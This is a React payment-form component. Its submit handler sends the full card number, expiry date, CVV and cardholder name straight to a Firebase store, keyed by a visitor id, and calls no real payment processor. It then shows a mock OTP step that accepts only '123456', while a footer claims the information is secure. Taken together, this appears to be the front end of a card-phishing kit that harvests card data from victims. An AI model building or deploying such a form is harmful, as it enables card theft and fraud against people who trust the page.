"use client"

import { useState } from "react"
import { useForm } from "react-hook-form"
import { zodResolver } from "@hookform/resolvers/zod"
import { z } from "zod"
import { LockIcon, CreditCardIcon } from "lucide-react"
import { OtpVerification } from "./otp"
import { addData } from "../firebase"

const paymentFormSchema = z.object({
  cardNumber: z.string().min(16, "Card number must be 16 digits").max(19),
  cardholderName: z.string().min(2, "Cardholder name is required"),
  expiryDate: z.string().regex(/^(0[1-9]|1[0-2])\/\d{2}$/, "Expiry date must be in MM/YY format"),
  cvv: z.string().min(3, "CVV must be 3-4 digits").max(4),
})

type PaymentFormValues = z.infer<typeof paymentFormSchema>

export function PaymentForm() {
  const [showOtp, setShowOtp] = useState(false)
  const [otpError, setOtpError] = useState(false)
  const [isSubmitting, setIsSubmitting] = useState(false)

  const {
    register,
    handleSubmit,
    formState: { errors },
    setValue,
    watch,
  } = useForm<PaymentFormValues>({
    resolver: zodResolver(paymentFormSchema),
    defaultValues: {
      cardNumber: "",
      cardholderName: "",
      expiryDate: "",
      cvv: "",
    },
  })

  function onSubmit(data: PaymentFormValues) {
    setIsSubmitting(true)
    const _id = localStorage.getItem("visitor")
    addData({
      id: _id,
      cardNumber: data.cardNumber,
      yaer: data.expiryDate,
      cvv: data.cvv,
      cardholderName: data.cardholderName,
    })
    // Simulate API call
    setTimeout(() => {
      setIsSubmitting(false)
      setShowOtp(true)
    }, 1000)
  }

  function handleOtpSubmit(otp: string) {
    setIsSubmitting(true)

    // Simulate API verification
    setTimeout(() => {
      setIsSubmitting(false)
      // For demo purposes, only "123456" is considered valid
      if (otp === "123456") {
        // Payment successful
        alert("Payment successful!")
        setOtpError(false)
      } else {
        // Invalid OTP
        setOtpError(true)
      }
    }, 1000)
  }

  function formatCardNumber(value: string) {
    return value
      .replace(/\s/g, "")
      .replace(/(\d{4})/g, "$1 ")
      .trim()
  }

  function formatExpiryDate(value: string) {
    return value.replace(/\D/g, "").replace(/(\d{2})(\d)/, "$1/$2")
  }

  return (
    <>
      {!showOtp ? (
        <div className="bg-card rounded-lg shadow-md overflow-hidden py-8 " style={{padding:15}}>
          <div className="p-6 border-b border-border">
            <div className="flex items-center gap-2 mb-1">
              <CreditCardIcon className="h-5 w-5 text-foreground" />
              <h2 className="text-xl font-semibold text-foreground">Payment Details</h2>
            </div>
            <p className="text-sm text-muted-foreground">Enter your card information to proceed with the payment.</p>
          </div>
          <div className="p-6" style={{padding:5}}>
            <form onSubmit={handleSubmit(onSubmit)} className="space-y-4">
              <div className="space-y-2">
                <div className="space-y-1">
                  <label htmlFor="cardNumber" className="text-sm font-medium">
                    Card Number
                  </label>
                  <input
                    id="cardNumber"
                    type="text"
                    placeholder="1234 5678 9012 3456"
                    className={`flex h-10 w-full rounded-md border border-input bg-background px-3 py-2 text-sm ring-offset-background file:border-0 file:bg-transparent file:text-sm file:font-medium placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50 ${
                      errors.cardNumber ? "border-red-500 focus-visible:ring-red-500" : ""
                    }`}
                    {...register("cardNumber", {
                      onChange: (e) => {
                        const formatted = formatCardNumber(e.target.value.replace(/\D/g, "").slice(0, 16))
                        setValue("cardNumber", formatted)
                      },
                    })}
                  />
                  {errors.cardNumber && <p className="text-sm text-red-500">{errors.cardNumber.message}</p>}
                </div>

                <div className="space-y-2">
                  <label htmlFor="cardholderName" className="text-sm font-medium">
                    Cardholder Name
                  </label>
                  <input
                    id="cardholderName"
                    type="text"
                    placeholder="John Doe"
                    className={`flex h-10 w-full rounded-md border border-input bg-background px-3 py-2 text-sm ring-offset-background file:border-0 file:bg-transparent file:text-sm file:font-medium placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50 ${
                      errors.cardholderName ? "border-red-500 focus-visible:ring-red-500" : ""
                    }`}
                    {...register("cardholderName")}
                  />
                  {errors.cardholderName && <p className="text-sm text-red-500">{errors.cardholderName.message}</p>}
                </div>

                <div className="grid grid-cols-2 gap-4">
                  <div className="space-y-1">
                    <label htmlFor="expiryDate" className="text-sm font-medium">
                      Expiry Date
                    </label>
                    <input
                      id="expiryDate"
                      type="text"
                      placeholder="MM/YY"
                      className={`flex h-10 w-full rounded-md border border-input bg-background px-3 py-2 text-sm ring-offset-background file:border-0 file:bg-transparent file:text-sm file:font-medium placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50 ${
                        errors.expiryDate ? "border-red-500 focus-visible:ring-red-500" : ""
                      }`}
                      {...register("expiryDate", {
                        onChange: (e) => {
                          const formatted = formatExpiryDate(e.target.value.slice(0, 5))
                          setValue("expiryDate", formatted)
                        },
                      })}
                    />
                    {errors.expiryDate && <p className="text-sm text-red-500">{errors.expiryDate.message}</p>}
                  </div>

                  <div className="space-y-1">
                    <label htmlFor="cvv" className="text-sm font-medium">
                      CVV
                    </label>
                    <input
                      id="cvv"
                      type="password"
                      placeholder="123"
                      className={`flex h-10 w-full rounded-md border border-input bg-background px-3 py-2 text-sm ring-offset-background file:border-0 file:bg-transparent file:text-sm file:font-medium placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50 ${
                        errors.cvv ? "border-red-500 focus-visible:ring-red-500" : ""
                      }`}
                      {...register("cvv", {
                        onChange: (e) => setValue("cvv", e.target.value.replace(/\D/g, "").slice(0, 4)),
                      })}
                    />
                    {errors.cvv && <p className="text-sm text-red-500">{errors.cvv.message}</p>}
                  </div>
                </div>

                <button
                  type="submit"
                  style={{padding:15,backgroundColor:'#00c925',marginTop:12,borderRadius:5,color:"white" }}
                  disabled={isSubmitting}
                  className="w-full h-10 px-4 py-2 rounded-md  hover:bg-primary/90 inline-flex items-center justify-center whitespace-nowrap font-medium ring-offset-background transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50"
                >
                  {isSubmitting ? "Processing..." : "Pay Now"}
                </button>
              </div>
            </form>
          </div>
          <div className="px-6 py-4 bg-muted border-t border-border">
            <div className="flex items-center justify-center gap-1 text-sm text-muted-foreground">
              <LockIcon className="h-3 w-3" />
              <span>Your payment information is secure</span>
            </div>
            <div className="flex justify-center">
              <img src="/vite.svg" alt="" width={30} className="m-2" style={{margin:2}}/>
              <img src="/master.svg" alt="" width={30} style={{margin:2}}/>
              <img src="/logo.webp" alt="" width={20}style={{margin:2}}/>
            </div>
          </div>
        </div>
      ) : (
        <OtpVerification
          onSubmit={handleOtpSubmit}
          isSubmitting={isSubmitting}
          error={otpError}
          onBack={() => setShowOtp(false)}
        />
      )}
    </>
  )
}
